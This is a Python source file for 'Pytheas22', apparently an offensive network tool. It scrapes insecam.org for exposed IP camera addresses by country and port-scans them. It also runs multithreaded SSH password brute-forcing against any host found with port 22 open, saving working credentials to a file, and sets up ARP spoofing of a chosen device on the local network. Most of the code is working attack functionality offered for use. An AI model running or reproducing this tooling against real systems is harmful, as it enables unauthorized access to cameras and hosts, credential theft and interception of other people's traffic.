import os
import random
import shutil
import socket
import string
import subprocess
import threading
import time
import BetterPrinting as bp
import re
import sqlite3
from requests.structures import CaseInsensitiveDict
import requests
import colorama
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import sys
import csv
import ipaddress
from .port_data import check_ports
from .gui_pytheas import string_port


class PortScanner:
    ip_subnett = []
    waiting = False
    well_known_ports = [20, 21, 22, 23, 25, 53, 80, 110, 119, 123, 135, 139, 143, 161, 194, 389, 443, 445, 515, 520,
                        636, 3389, 5060, 5061, 5357, 8001, 8002, 8080, 9080, 9999, 62078]
    is_web = False
    all_colors = ["red", "blue", "green", "cyan", "yellow", "magenta"]
    random_color = random.choice(all_colors)
    ssh_port = []
    every_ip_with_name = []
    my_ip_address = None
    check_open_port = []
    hostnames = {}
    hostname = None
    open_ports = []
    nice_printing = []
    all_intern_ip = None
    scan_all = False
    pps = False
    ipv6 = False
    public_ip = False

    def __init__(self):
        self.headers = None
        self.country_name = None
        self.addresses = None
        self.gui = string_port

    def print_gui(self):
        bp.color(self.gui, PortScanner.random_color)

    def cool_text(self):
        thread_wait = threading.Thread(target=PortScanner.wait)
        thread_wait.start()
        time.sleep(5)
        PortScanner.waiting = True
        time.sleep(1)
        PortScanner.waiting = False

    def get_lst(self, port_range="20-80", known_ports=False):
        error = "ERROR (EXAMPLE: 20-80)"
        if known_ports is True:
            return PortScanner.well_known_ports

        try:
            if "-" in port_range:
                try:
                    return range(int(port_range.split("-")[0]), int(port_range.split("-")[1]) + 1)
                except ValueError:
                    return error
            else:
                print(error)
                quit()
        except TypeError:
            return error

    @staticmethod
    def check_char(wort, idx, zeichen):
        wort = [*wort]
        wort[idx] = zeichen
        wort = "".join(wort)
        return wort

    @staticmethod
    def print_text(word):
        color = bp.color(f"\r{word}", PortScanner.random_color, False)
        print(color, end="")

    @staticmethod
    def wait():
        wort = "Welcome to PYTHEAS22".upper()
        print()
        while True:
            for idx, letter in enumerate(wort):
                try:
                    if letter.upper() == letter:
                        new = letter.lower()
                    else:
                        new = letter.upper()

                    wort = PortScanner.check_char(wort, idx, new)

                    if "2" == letter:
                        wort = PortScanner.check_char(wort, idx, "?")

                    elif "?" == letter:
                        wort = PortScanner.check_char(wort, idx, "2")
                    PortScanner.print_text(wort)
                    time.sleep(0.1)
                    wort = PortScanner.check_char(wort, idx, letter)
                    PortScanner.print_text(wort)

                    if PortScanner.waiting:
                        print()
                        sys.exit()
                except KeyboardInterrupt:
                    quit()

    @staticmethod
    def add_to_db(country_names, ip_address, open_ports, name=""):
        if name != "":
            port_name = f"{country_names[name]}_Ports.db"
        else:
            port_name = f"Ports.db"
        con = sqlite3.connect(port_name)

        cur = con.cursor()
        cur.execute('''CREATE TABLE IF NOT EXISTS Ports
                        (IPAddress, Open Ports)''')

        cur.execute("INSERT OR IGNORE INTO Ports VALUES (?,?)",
                    (ip_address, open_ports))
        con.commit()

    @staticmethod
    def add_to_db_intern(ip_address, open_ports):
        con = sqlite3.connect('Internal_Network.db')

        cur = con.cursor()
        cur.execute('''CREATE TABLE IF NOT EXISTS Ports
                                (IPAddress, Open Ports, Time)''')

        cur.execute("INSERT OR IGNORE INTO Ports VALUES (?,?,?)",
                    (ip_address, open_ports, time.strftime("%d.%m.%y - %H:%M")))
        con.commit()

    @classmethod
    def get_ip(cls):
        open_ports = subprocess.run(["ip", "a"], capture_output=True)
        everything = str(open_ports).split()
        ipaddress = [everything[ip + 1] for ip, inet in enumerate(everything) if inet == "inet"]

        for each_ip in ipaddress:
            real_ip = each_ip.split("/")
            if real_ip[0] != "127.0.0.1":
                cls.ip_subnett.append((real_ip[0], real_ip[1]))

        host = cls.ip_subnett[0][0].split(".")
        host[-1] = "0"
        host_ip = ".".join(host)
        return host_ip, cls.ip_subnett

    def counter(self, country):
        res = requests.get(
            f"http://www.insecam.org/en/bycountry/{country}", headers=self.headers
        )
        last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
        all_ips = []
        for page in range(int(last_page)):
            res = requests.get(
                f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                headers=self.headers
            )
            find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)

            all_ips.extend(find_ip)
            amount = bp.color(f"\rScanning {page + 1} of {int(last_page)}".upper(), PortScanner.random_color, False)
            print(amount, end="")
        directory = f"{self.country_name[country]}_hacked_IP_Cameras"
        if os.path.exists(directory):
            shutil.rmtree(directory)

        os.mkdir(directory)
        os.chdir(directory)
        with open(f"{self.country_name[country]}_IP-Cameras.txt", "a+") as file:
            for each_ip in all_ips:
                file.write(f"{each_ip}\n")

        return all_ips

    def ask_range(self):
        lst_everything = []
        str_quest = bp.color("Do you want to parse through wellknown ports? y/n: ", PortScanner.random_color, False)
        question = input(str_quest)

        if question == "y":
            lst_everything.extend(PortScanner.well_known_ports)
        else:
            bp.color(
                "To specify the range you simply write 'number1-number2'. "
                "Number 1 should be smaller than number 2\nIf you only want "
                "to scan one port. Just type one number".upper(),
                PortScanner.random_color)
            str_range = bp.color("What is your range: ", PortScanner.random_color, False)
            while True:
                str_port_range = input(str_range)
                if "-" in str_port_range:
                    try:
                        first_number, second_number = int(str_port_range.split("-")[0]), int(
                            str_port_range.split("-")[1])
                        if first_number > second_number:
                            print("SECOND NUMBER IS GREATER THAN THE FIRST NUMBER. (min-max)")
                            continue

                        get_range = PortScanner()
                        real_range = get_range.get_lst(port_range=str_port_range)
                        lst_everything.extend(real_range)
                        return lst_everything

                    except:
                        print("PLEASE TYPE INT")
                        continue


                else:
                    try:
                        str_port_range = int(str_port_range)
                        lst_everything.append(str_port_range)
                        return lst_everything

                    except ValueError:
                        print("PLEASE WRITE A RANGE. EXAMPLE '20-80'. OR ONLY ONE NUMBER. EXAMPLE '22'")
                        continue
        return lst_everything

    def validate_ip(self, ip, hostname):
        try:
            check_ip = ipaddress.ip_address(hostname)

        except:
            self.hostnames[ip] = hostname

    def manufacture(self, mac):
        data = requests.get(f"https://maclookup.app/search/result?mac={mac}")
        split_data = data.text.split("\n")

        if "No assignment is found for this MAC" not in data.text:
            get_action = [every_action for every_action in split_data if
                          '<div class="col-md-12" style="padding-bottom: 1em">' in every_action]
            get_name = get_action[0].split("h2")
            second = get_name[1]
            this_name = second.split("<")
            real_name = this_name[0].replace(">", "")
            if self.hostname is not None:
                return f"{real_name} (hostname: {self.hostname})"
            else:
                return real_name

        else:
            if self.hostname is not None:
                return f"Unknown (hostname: {self.hostname})"
            else:
                return "Unknown"

    def get_name(self, ip, mac_address):
        if re.match(r'(?:[0-9a-fA-F]-?){12}', mac_address) or re.match(r'(?:[0-9a-fA-F]:?){12}', mac_address):
            if ip in self.hostnames:
                self.hostname = self.hostnames[ip]

            data = self.manufacture(mac_address)
            self.hostname = None
            return data

        else:
            pass

    def pinging(self, ip):
        try:
            ping = subprocess.run(["ping", "-a", ip, "-n", "1", "-w", "1000"], capture_output=True).stdout
            get_hostname = ping.split()[4].decode()
            validate = PortScanner()
            validate.validate_ip(ip, get_hostname)

        except:
            print("THANK YOU FOR USING PYTHEAS22")
            os._exit(0)

    def internal_windows(self):
        cmd = subprocess.run(["ipconfig", "/all"], capture_output=True)
        split_cmd = str(cmd).split()

        klammer = r"\d+.\d+.\d+.\d+"
        get_all = re.findall(klammer, str(cmd))
        data = [every for every in split_cmd if "(" in every]

        all_ips = [each for each in get_all for every_data in data if each in every_data]

        valid_ip = []
        for every_ip in all_ips:
            try:
                socket.inet_aton(every_ip)
                if every_ip.split(".")[-1] not in ["1", "255"]:
                    valid_ip.append(every_ip)
            except socket.error:
                continue

        PortScanner.my_ip_address = valid_ip[-1]
        getlast = PortScanner.my_ip_address.split(".")
        spalten = [f"{'.'.join(getlast[0:3])}.{block_number}" for block_number in range(1, 255)]
        for all_ip in spalten:
            t = threading.Thread(target=PortScanner.pinging, args=(PortScanner, all_ip,))
            t.start()

        time.sleep(1)
        arp = subprocess.run(["arp", "-a"], capture_output=True)
        split_data = str(arp).split()

        indexes = []
        for idx, arp_ip in enumerate(split_data):
            if f"{'.'.join(getlast[0:3])}" in arp_ip:
                if arp_ip != PortScanner.my_ip_address:
                    mac_ip = split_data[idx + 1]
                    if mac_ip != "ff-ff-ff-ff-ff-ff":
                        indexes.append((arp_ip, mac_ip))

        get_mac = PortScanner()
        ip_name = [(ip, get_mac.get_name(ip, mac)) for ip, mac in indexes]
        return ip_name

    @staticmethod
    def get_router_ip():
        potential_router_ip = [PortScanner.every_ip_with_name[0][0], PortScanner.every_ip_with_name[-1][0]]
        for router in potential_router_ip:
            if router.split(".")[-1] in ["1", "254"]:
                return router

    @staticmethod
    def change_file(filename, pos1, pos2, device):
        with open(filename, "r+") as file:
            data = file.read()
            data = data.split()
            data[21] = device
            data[23] = pos1
            data[24] = pos2 + ")"
            data[0] += "\n"
            data[6] += "\n"
            data[14] += "\n"
            data[16] += "\n"

            for idx, space in enumerate(data[1:]):
                if idx not in [0, 6, 14, 16]:
                    data[idx] += " "

        with open(filename, "w+") as file:
            for each in data:
                file.write(each)

    @staticmethod
    def __spoof_ip(router, target):
        get_device = subprocess.run(["nmcli", "connection", "show"], capture_output=True).stdout.decode()

        get_device = get_device.split()[4:]

        all_conncections = ["ethernet", "wifi", "loopback"]
        devices = []
        for idx, each in enumerate(get_device):
            if each in all_conncections:
                device = get_device[idx + 1]
                if device != "lo":
                    devices.append(device)

        if devices:
            while True:
                all_devices = " ".join(devices)
                bp.color(f"\nALL DEVICES: {all_devices}\n", PortScanner.random_color)
                chosen_device = input(
                    bp.color("WHICH DEVICE DO YOU WANT TO RUN YOUR SPOOF ON?: ", PortScanner.random_color, False))
                if chosen_device in devices:
                    PortScanner.change_file("/home/potens/Pytheas22/router.sh", router, target, chosen_device)
                    PortScanner.change_file("/home/potens/Pytheas22/target.sh", target, router, chosen_device)
                    bp.color("\n\nOPEN TWO TERMINALS\n"
                             "RUN 'bash router.sh' ON THE FIRST TERMINAL AND \n"
                             "RUN 'bash target.sh' ON THE SECOND TERMINAL\n"
                             "TO SPOOF YOUR TARGET\n\nTHANK YOU FOR USING PYTHEAS22", PortScanner.random_color)
                    sys.exit()

                else:
                    print(f"{chosen_device} IS NOT IN LIST")
                    continue


        else:
            print("YOU ARE NOT CONNECTED WITH THE INTERNET")
            print("THANK YOU FOR USING PYTHEAS22")
            sys.exit()

    def arp_spoof(self):
        self.ip = None
        if sys.platform != "linux":
            print("SORRY THIS ONLY WORKS ON LINUX. YOU CAN USE A VIRTUAL MACHINE TO RUN THIS")
            sys.exit()
        else:
            self.linux_lst()
            self.print_internal()

            all_ips = [ip[0] for ip in PortScanner.every_ip_with_name]
            router = self.get_router_ip()
            while True:
                try:
                    str_this_ip = bp.color("Which ip do you want to arp spoof (just write the number of your ip)?: ",
                                           PortScanner.random_color, False)
                    self.ip = int(input(str_this_ip))
                    if self.ip <= 0:
                        print("PLEASE WRITE A NUMBER THAT IS ABOVE YOU")
                        continue
                    else:
                        self.ip = all_ips[self.ip - 1]

                    if router:
                        if self.ip != router:
                            spoof = PortScanner()
                            spoof.__spoof_ip(router, self.ip)
                        else:
                            print("YOU CANNOT SPOOF YOUR ROOTER")
                            continue
                    else:
                        print("THE ROUTER COULD NOT BE FOUND. PLEASE TYPE IT MANUALLY")
                        router_question = bp.color("\nRouter's IP: ", PortScanner.random_color, False)
                        get_router = input(router_question)
                        spoof = PortScanner()
                        spoof.__spoof_ip(get_router, self.ip)

                except ValueError:
                    print("PLEASE WRITE NUMBERS NOT STRINGS")
                    continue

                except IndexError:
                    print("PLEASE WRITE A NUMBER THAT IS ABOVE YOU")
                    continue

    @staticmethod
    def linux_lst():
        threading_wait = threading.Thread(target=PortScanner.wait)
        threading_wait.start()
        host_ip = PortScanner.get_ip()
        PortScanner.my_ip_address = host_ip[1][0][0]
        all_data = subprocess.run(["netdiscover", "-r", f"{host_ip[0]}/{host_ip[1][0][1]}", "-P"], capture_output=True).stdout.decode()
        PortScanner.waiting = True
        time.sleep(0.6)
        PortScanner.waiting = False
        order_ips = sorted([int(each.split()[0].split(".")[-1]) for each in all_data.split("\n") if re.findall(r"\d+.\d+.\d+.\d+", each)] + [int(str(PortScanner.my_ip_address).split(".")[-1])])

        get_all_hostnames = {each.split()[0]: " ".join(each.split()[4:]) for each in all_data.split("\n") if
                             re.findall(r"\d+.\d+.\d+.\d+", each)}

        get_all_hostnames[PortScanner.my_ip_address] = "MY IP-ADDRESS"
        sorted_ips = [(ip, host) for each_number in order_ips for ip, host in get_all_hostnames.items() if
                      str(each_number) == ip.split(".")[-1]]

        PortScanner.every_ip_with_name = sorted_ips

    @staticmethod
    def print_internal():
        all_intern_ip = []
        just_ips = []
        for number, every_ip in enumerate(PortScanner.every_ip_with_name):
            ip_name = every_ip[1]
            all_intern_ip.append(every_ip[0])
            try:
                check_ipv6 = PortScanner()
                if check_ipv6.ipv6:
                    iphone = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                else:
                    iphone = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                iphone.settimeout(0.5)
                iphone.connect((every_ip[0], 62078))
                ip_name = "Apple Device"
            except:
                pass

            ip_len = f"[{number + 1}]:"
            length = 6 - len(ip_len)
            spaces_len = f"".join([" " for _ in range(length)])
            ip_len += spaces_len
            printing = f"{ip_len}{every_ip[0]}          "
            amount_spaces = 34 - len(printing)
            spaces = f"".join([" " for _ in range(amount_spaces)])
            printing += spaces

            bp.color(f"{printing}{ip_name}", PortScanner.random_color)
            just_ips.append(every_ip[0])
        return all_intern_ip, just_ips


    def scan_all_ip(self):
        start = time.perf_counter()
        for idx, every_port in enumerate(self.all_intern_ip):
            counter = bp.color(f"\nScanning {idx + 1} of {len(self.all_intern_ip)}\n".upper(),
                               PortScanner.random_color, False)
            print(counter, end="")
            scan = PortScanner()
            scan.start_scanning(PortScanner.well_known_ports, every_port, print_text=False,
                                ssh=True, scan_internal_ip=True)
            time.sleep(0.5)
        end = time.perf_counter()
        seconds = round(end - start, 2)

        nice_printing = PortScanner()
        nice_printing.print_func()

        if "Internal_Network.db" in os.listdir():
            bp.color("All open ports in your network has been saved to 'Internal_Network.db'",
                     PortScanner.random_color)
        else:
            bp.color("No IP'Address has an open port", PortScanner.random_color)

        if PortScanner.ssh_port:
            hacking = PortScanner()
            hacking.hack_ip_ssh(PortScanner.ssh_port)

        bp.color(
            f"IT TOOK PYTEASS22 {seconds} SECONDS TO SCAN {len(self.all_intern_ip)} IP's WITH {len(PortScanner.well_known_ports)} Ports",
            PortScanner.random_color)
        bp.color("THANK YOU FOR USING PYTHEAS22", PortScanner.random_color)
        quit()

    @staticmethod
    def internal_network():
        global this_ip, answer_intern
        bp.color("ALL THE DEVICES IN YOUR NETWORK WILL BE SHOWN SOON", PortScanner.random_color)
        if sys.platform == "linux":
            get_lst = PortScanner()
            get_lst.linux_lst()

        elif sys.platform == "win32" or sys.platform == "windows" or sys.platform == "win64":
            win_threading_wait = threading.Thread(target=PortScanner.wait)
            win_threading_wait.start()
            windows = PortScanner()
            PortScanner.every_ip_with_name = windows.internal_windows()
            time.sleep(0.5)
            PortScanner.waiting = True
            time.sleep(0.5)
            PortScanner.waiting = False

        print()
        PortScanner.all_intern_ip, just_ips = PortScanner.print_internal()

        while True:
            if PortScanner.pps and not PortScanner.scan_all:
                break

            if not PortScanner.scan_all:
                scan_intern = bp.color("\nDo you want to scan all ip's? [y/n]: ".upper(), PortScanner.random_color, False)
                answer_intern = input(scan_intern)

                if answer_intern.lower() == "n":
                    break

                elif answer_intern.lower() == "y":
                    scan_internal = PortScanner()
                    scan_internal.scan_all_ip()

            elif PortScanner.scan_all:
                scan_internal = PortScanner()
                scan_internal.scan_all_ip()


        while True:
            try:
                str_this_ip = bp.color("Which ip do you want to scan (just write the number of your ip)?: ",
                                       PortScanner.random_color, False)
                this_ip = int(input(str_this_ip))
                if this_ip <= 0:
                    print("PLEASE WRITE A NUMBER THAT IS ABOVE YOU")
                    continue
                else:
                    this_ip = just_ips[this_ip - 1]
                break
            except ValueError:
                print("PLEASE WRITE NUMBERS NOT STRINGS")
                continue

            except IndexError:
                print("PLEASE WRITE A NUMBER THAT IS ABOVE YOU")
                continue
        return this_ip

    # David Bombal's Code big thanks to him
    def __ssh_connect(self, host, username, password):
        ssh_client = SSHClient()
        ssh_client.set_missing_host_key_policy(AutoAddPolicy())
        try:
            ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
            with open("credentials_found.txt", "a") as file:
                bp.color(f"Username - {username} and Password - {password} found for {host}!!!!1",
                         PortScanner.random_color)
                file.write(
                    f"Username: {username}\nPassword: {password}\nWorked on host {host}\nTime: {time.strftime('%H:%M - %d.%m.%y')}\n\n")
                bp.color("CHECK 'credentials_found.txt' TO SEE YOUR PASSWORD", PortScanner.random_color)
                time.sleep(1)
        except AuthenticationException:
            bp.color(f"Username - {username} and Password - {password} is Incorrect for {host}",
                     PortScanner.random_color)
        except ssh_exception.SSHException:
            bp.color("**** Attempting to connect - Rate limiting on server ****", PortScanner.random_color)

    def hack_ip_ssh(self, ssh_lst):
        if len(ssh_lst) == 1:
            self.addresses = f"\nThe IP-Address {ssh_lst[0]} has the ssh port opened. Do you want to bruteforce that ip? [y/n]: ".upper()
        else:
            self.addresses = f"\nMultiple addresses you have scanned have the ssh port opened {ssh_lst}. Do you want to brutefore those ip's? [y/n]: ".upper()

        while True:
            ssh_question = bp.color(self.addresses, PortScanner.random_color, False)
            question = input(ssh_question)
            if question.lower() == "n":
                bp.color("\nTHANK YOU FOR USING PYTHEAS22", PortScanner.random_color)
                break

            elif question.lower() == "y":
                bp.color("\nTHANK YOU FOR USING PYTHEAS22\nSTARTING BRUTEFORCE\n", PortScanner.random_color)
                logging.getLogger('paramiko.transport').addHandler(NullHandler())
                list_file = "passwords.csv"
                all_passwords = []
                try:
                    with open(list_file, "r+") as file:
                        csv_reader = csv.reader(file, delimiter=",")
                        all_passwords.extend(csv_reader)
                except FileNotFoundError:
                    bp.color(
                        f"'passwords.csv' could not be found. Download the file on my github: https://github.com/Kill0geR/Pytheas22",
                        PortScanner.random_color)
                    quit()

                for host in ssh_lst:
                    for index, row in enumerate(all_passwords):
                        t = threading.Thread(target=self.__ssh_connect, args=(host, row[0], row[1],))
                        t.start()
                        time.sleep(0.2)

                break

    def tcp_connect(self, ip, port, print_text):
        bp.color(f"SCANNING PORT: {port}", PortScanner.random_color)
        try:
            check_ipv6 = PortScanner
            if check_ipv6.ipv6:
                start = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                start = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            start.settimeout(1)
            try:
                start.connect((ip, port))
                self.open_ports.append(port)
                self.check_open_port.append(port)
                time.sleep(0.5)
                if port == 22: self.ssh_port.append(ip)

            except socket.gaierror:
                if not PortScanner.is_web and not PortScanner.ipv6:
                    if print_text:
                        bp.color("THIS IP IS NOT AVAILABLE", PortScanner.random_color)
                else:
                    if print_text:
                        bp.color(f"WEBSITE: {ip} IS NOT AVAILABLE", PortScanner.random_color)
                quit()

            except KeyboardInterrupt:
                quit()

            except:
                pass
        except ConnectionRefusedError:
            pass

        except OSError:
            pass

    @staticmethod
    def get_location_of_ip(ip):
        if "." in ip or ":" in ip:
            if "." in ip: url = f"https://www.geolocation.com/de?ip={ip}#ipresult"
            else:
                new_url = '%20'.join(ip.split(":"))
                url = f"https://www.geolocation.com/de?ip={new_url}#ipresult"
            if len(ip.split(".")) == 4 or len(ip.split(":")) > 5:
                print("\nGetting the potential location of the address")
                data = requests.get(url).text.replace(r"\\t", "").replace(r"\\r", "").split()

                relevant_data = [f"<div><label><strong>{each_data}</strong></label></div>" for each_data in
                                 ["Land", "Region", "Stadt", "Postleitzahl", "ISP", "Domänenname"]]
                get_relevant_data = [data.index(rel) for rel in relevant_data if rel in data]
                information = []
                for idx in get_relevant_data:
                    this_lst = []
                    for every in data[idx + 1:]:
                        if "</td>" in every:
                            break
                        this_lst.append(every)
                    info = " ".join(this_lst)
                    for every_item in ["<img", "[", "<a"]:
                        info = info.split(every_item)[0]

                    information.append(info.strip())
                return (f"\n\nTHE IP IS FROM {information[0]}\n\n"
                        f"REGION: {information[1]}\nCITY: {information[2]}\n"
                        f"POSTCODE: {information[3]}\nISP (Internet Service Provider): {information[4]}\n"
                        f"Domain: {information[5]}\n")
        return "\n\nNo location found\n\n"

    @staticmethod
    def print_func():
        if PortScanner.nice_printing:
            idx = 0
            for ip, port_lst in PortScanner.nice_printing:
                idx += 1
                print("".join("_" for _ in range(50)))
                bp.color(f"[{idx}] {ip} open ports\n", PortScanner.random_color)
                for checking, each in enumerate(port_lst):
                    bp.color(each, PortScanner.random_color)
                    if checking != port_lst.index(port_lst[-1]):
                        print()
                print("".join("_" for _ in range(50)))
                print(f"\n\n")

    def start_scanning(self, port_lst, this_ip, print_text=True, country=None, ssh=False, scan_internal_ip=False):
        original = this_ip
        if "http" in this_ip:
            this_ip = this_ip.split("/")[2]
            if ":" in this_ip:
                this_ip = this_ip.split(":")[0]
            PortScanner.is_web = True

        else:
            if ":" in this_ip:
                split_ipv6 = this_ip.split(":")
                if len(split_ipv6) > 5:
                    PortScanner.ipv6 = True
                else:
                    bp.color("IPV6-ADDRESS IS NOT COMPLETED", PortScanner.random_color)
                    quit()

            else:
                for each in [*this_ip]:
                    if each in string.ascii_lowercase:
                        bp.color("PLEASE USE THE FULL LINK. WITH IS CORRESPONDING PROTOCOL (e.g https://google.com)",
                                 PortScanner.random_color)
                        quit()
        if not PortScanner.is_web and not PortScanner.ipv6:
            if this_ip.split(".")[0] not in ["10", "127", "172", "192"]:
                PortScanner.public_ip = True

        if "http" in original:
            bp.color(f"Scanning the website: ".upper() + f'{original}\n', PortScanner.random_color)
        else:
            bp.color(f"Scanning the ip-address: '{original}'\n".upper(), PortScanner.random_color)

        start_time = time.perf_counter()
        threads = []
        for port in port_lst:
            connect = PortScanner()
            t = threading.Thread(target=connect.tcp_connect, args=(this_ip, port, print_text))
            threads.append(t)

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        end = time.perf_counter()
        print(f"IT TOOK AROUND {round(end - start_time, 2)} SECONDS TO FINISH SCANNING PORTS")
        location = PortScanner()
        if PortScanner.is_web:
            output = subprocess.run(["nslookup", this_ip], capture_output=True)
            new_data = str(output).split("\\n")
            all_addresses = [addr.split(":")[1].replace(addr.split(":")[1][0], "") for addr in new_data if
                             "Address" in addr if "." in addr if "#" not in addr]
            if len(all_addresses) == 1:
                if print_text:
                    location = PortScanner()
                    text = location.get_location_of_ip(all_addresses[0])
                    bp.color(f"Website {this_ip} has 1 address {text}", PortScanner.random_color)
                    bp.color(f"{all_addresses[0]} is the ip address of {this_ip}\n", PortScanner.random_color)

            else:
                if print_text:
                    bp.color(f"Website {this_ip} has {len(all_addresses)} addresses\n", PortScanner.random_color)
                    for idx, each_addr in enumerate(all_addresses): bp.color(
                        f"[{idx + 1}] {each_addr} is one of the addresses of {this_ip} {location.get_location_of_ip(each_addr)}", PortScanner.random_color)

        if PortScanner.ipv6 or PortScanner.public_ip:
            bp.color(location.get_location_of_ip(this_ip), PortScanner.random_color)

        print()
        if self.open_ports:
            if print_text:
                this_lst = [
                    bp.color(f"{this_ip} has port {each_port} opened | {check_ports(each_port, this_ip)}",
                             PortScanner.random_color, False) for
                    each_port in self.open_ports]
                bp.ui.list(this_lst, f"ALL OPEN PORTS FOR {this_ip}")

            if country is not None:
                PortScanner.nice_printing.append((this_ip,
                                                  [f"{print_port}: {check_ports(print_port, this_ip)}" for
                                                   print_port in self.open_ports]))
                PortScanner.add_to_db(self.country_name, this_ip, "".join(str(self.open_ports)), name=country)
                PortScanner.open_ports = []

            if self.ssh_port and country is None and ssh is True and scan_internal_ip is False:
                self.hack_ip_ssh(self.ssh_port)

            if ssh is False:
                print("SET ssh_bruteforce TO TRUE IF YOU WANT TO BRUTEFORCE THAT IP-ADDRESS")

            if scan_internal_ip:
                PortScanner.nice_printing.append((this_ip,
                                                  [f"{print_port}: {check_ports(print_port, this_ip)}" for
                                                   print_port in self.open_ports]))
                PortScanner.add_to_db_intern(this_ip, "".join(str(self.open_ports)))
                PortScanner.open_ports = []

        else:
            if print_text:
                if 62078 not in port_lst:
                    bp.color(f"\nThis IP-Address: {this_ip} has no ports open from {port_lst[0]}-{port_lst[-1]}",
                             PortScanner.random_color)
                else:
                    bp.color(f"\nThis IP-Address: {this_ip} has no ports open from all wellknown ports",
                             PortScanner.random_color)
        if print_text and not self.ssh_port:
            bp.color("\nTHANK YOU FOR USING PYTHEAS22", PortScanner.random_color)

    def ip_cameras(self, port_lst=None):
        colorama.init()

        url = "http://www.insecam.org/en/jsoncountries/"

        self.headers = CaseInsensitiveDict()
        self.headers[
            "Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        self.headers["Cache-Control"] = "max-age=0"
        self.headers["Connection"] = "keep-alive"
        self.headers["Host"] = "www.insecam.org"
        self.headers["Upgrade-Insecure-Requests"] = "1"
        self.headers[
            "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"

        resp = requests.get(url, headers=self.headers)

        data = resp.json()
        countries = data['countries']

        self.country_name = {}
        bp.color("ALL COUNTRIES WITH IP-CAMERAS WILL BE SHOWN SOON", PortScanner.random_color)
        self.cool_text()

        for key, value in countries.items():
            bp.color(f'Code : ({key}) - {value["country"]} / ({value["count"]})  ',
                     PortScanner.random_color)
            print("")
            self.country_name[key] = value["country"]

        while True:
            country = bp.color(
                "\nWhich country do you want to scan. Write the code for example 'LA' for Laos (vpn is recommended): ".upper(),
                PortScanner.random_color, False)
            answer = input(country)
            if answer.upper() in self.country_name:
                hacked_country = self.country_name[answer.upper()]
                if port_lst is None:
                    all_lst = self.ask_range()
                else:
                    all_lst = port_lst

                bp.color(f"\nGetting all the ip-cameras of {hacked_country}\n".upper(),
                         PortScanner.random_color)
                get_all_ports = PortScanner.counter(self, answer.upper())
                bp.color(f"\n'{hacked_country}_hacked_IP_CAMERAS' HAS BEEN MADE ALL DATA WILL BE STORED IN THERE",
                         PortScanner.random_color)
                bp.color(
                    f"ALL IP-CAMERAS WITH THEIR LINK HAS BEEN SAVED IN '{hacked_country}_IP-Cameras.txt'",
                    PortScanner.random_color)
                bp.color(
                    f"EVERY OPEN PORT OF THE IP-CAMERAS IN {hacked_country} WILL BE SAVED IN AN DATABASE CALLED {hacked_country}_Ports.db",
                    PortScanner.random_color)
                self.cool_text()

                bp.color("\nSTARTING\n", PortScanner.random_color)
                start = time.perf_counter()
                for idx, every_ip in enumerate(get_all_ports):
                    counter = bp.color(f"\nScanning {idx + 1} of {len(get_all_ports)}\n".upper(),
                                       PortScanner.random_color, False)
                    print(counter, end="")
                    self.start_scanning(all_lst, every_ip, print_text=False,
                                        country=answer.upper(), ssh=True)
                os.chdir("..")
                end = time.perf_counter()
                seconds = round(end - start, 2)
                if len(all_lst) == 1:
                    port = "Port"
                else:
                    port = "ports"

                nice_printing = PortScanner()
                nice_printing.print_func()

                print(
                    f"\nIT TOOK PYTEASS22 {seconds} SECONDS TO SCAN {len(get_all_ports)} IP's WITH {len(all_lst)} {port}")
                if self.ssh_port:
                    self.hack_ip_ssh(self.ssh_port)
                if self.check_open_port:
                    print(f"ALL OPEN PORTS HAVE BEEN SAVED IN THE DATABASE '{hacked_country}_Ports.db'")
                print(f"ALL LINKS HAVE BEEN SAVED IN {hacked_country}.\nTHANK YOU FOR USING PYTHEAS22")
                sys.exit()

            else:
                bp.color(f"{answer} is not in the list", PortScanner.random_color)
                continue

    def question(self):
        if sys.platform == "linux":
            if os.getuid() != 0:
                bp.color(string_port, PortScanner.random_color)
                bp.color("\nThis program must be run in root!!!!\n".upper(), "red")
                quit()

        bp.color(string_port, PortScanner.random_color)
        check_website = 0

        while True:
            global this_ip
            lst_everything = []
            str_internal = bp.color("\n\nDo you want to scan your network? [y/n]: ".upper(), PortScanner.random_color,
                                    False)
            internal_ips = input(str_internal)

            if internal_ips.lower() == "y":
                PortScanner.internal_network()
                break
            elif internal_ips.lower() == "n":
                while True:
                    global this_ip
                    multiple = bp.color("Do you want to scan IP-CAMERAS [y/n]: ".upper(), PortScanner.random_color,
                                        False)
                    quest = input(multiple)

                    if quest.lower() == "n":
                        ask_arp = bp.color("Do you want to Arp Spoof someone on your network [y/n]: ".upper(),
                                           PortScanner.random_color, False)
                        asking_arp = input(ask_arp)
                        if asking_arp.lower() == "y":
                            self.arp_spoof()
                        else:
                            str_an_ip = bp.color("Which ip or website do you want to Scan: ", PortScanner.random_color,
                                                 False)
                            this_ip = input(str_an_ip)
                            check_website += 1
                            break
                    elif quest.lower() == "y":
                        self.ip_cameras()

            elif internal_ips.lower() != "y" or internal_ips.lower() != "n":
                print("y or n please !!!".upper())
                continue
            if check_website >= 1:
                break

        lst_port = self.ask_range()
        lst_everything.extend(lst_port)

        self.start_scanning(lst_everything, this_ip, ssh=True)
